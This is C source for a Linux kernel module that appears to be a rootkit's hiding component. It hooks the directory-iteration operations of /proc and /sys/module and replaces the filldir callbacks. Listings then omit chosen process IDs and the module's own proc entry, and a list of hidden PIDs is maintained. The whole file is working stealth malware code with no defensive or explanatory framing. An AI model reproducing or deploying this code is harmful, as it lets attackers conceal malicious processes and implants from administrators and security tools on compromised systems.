#include "hidefs.h"

extern u8 module_hidden;

LIST_HEAD(hidden_pid_list);
extern struct semaphore hidden_pid_list_sem;

struct hidden_pid_t
{
    pid_t pid;
    struct list_head list;
};

// Vars for proc manipulation
int (*orig_proc_iterate_shared)(struct file *, struct dir_context *);
int (*orig_sys_iterate_shared)(struct file *, struct dir_context *);
int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                    unsigned);
int (*orig_sys_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                        unsigned);

int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
                    loff_t off, u64 ino, unsigned int d_type)
{
    long pid = 0;
    kstrtol(proc_name, 10, &pid);

    if (pid != 0)
    {
        if (is_hidden_proc(pid) && !is_hidden_proc(current->pid))
        {
            return 0;
        }
    }

    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return orig_filldir(ctx, proc_name, len, off, ino, d_type);
}

int rk_sys_filldir(struct dir_context *ctx, const char *proc_name, int len,
                   loff_t off, u64 ino, unsigned int d_type)
{
    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return orig_sys_filldir(ctx, proc_name, len, off, ino, d_type);
}

int rk_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
    orig_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = rk_proc_filldir;
    return orig_proc_iterate_shared(file, ctx);
}

int rk_sys_iterate_shared(struct file *file, struct dir_context *ctx)
{
    orig_sys_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = rk_sys_filldir;
    return orig_sys_iterate_shared(file, ctx);
}

int hidefs_init(void)
{
    FM_INFO("Init hidefs");
    SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
    SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);

    return 0;
}

int hidefs_clean(void)
{
    UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
    UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);

    return 0;
}

void hide_proc(pid_t pid)
{
    struct hidden_pid_t *hidden_pid;

    hidden_pid = kmalloc(sizeof(struct hidden_pid_t), GFP_KERNEL);
    hidden_pid->pid = pid;
    INIT_LIST_HEAD(&(hidden_pid->list));

    down(&hidden_pid_list_sem);
    list_add(&hidden_pid->list, &hidden_pid_list);
    up(&hidden_pid_list_sem);
}

void unhide_proc(pid_t pid)
{
    struct list_head *pos = NULL;
    struct hidden_pid_t *hidden_pid = NULL;

    list_for_each(pos, &hidden_pid_list)
    {
        hidden_pid = list_entry(pos, struct hidden_pid_t, list);
        if (hidden_pid->pid == pid)
        {
            down(&hidden_pid_list_sem);
            list_del(&hidden_pid->list);
            up(&hidden_pid_list_sem);

            kfree(hidden_pid);
            return;
        }
    }
}

bool is_hidden_proc(pid_t pid)
{
    struct list_head *pos = NULL;
    struct hidden_pid_t *hidden_pid = NULL;

    list_for_each(pos, &hidden_pid_list)
    {
        hidden_pid = list_entry(pos, struct hidden_pid_t, list);
        if (hidden_pid->pid == pid)
        {
            return 1;
        }
    }

    return 0;
}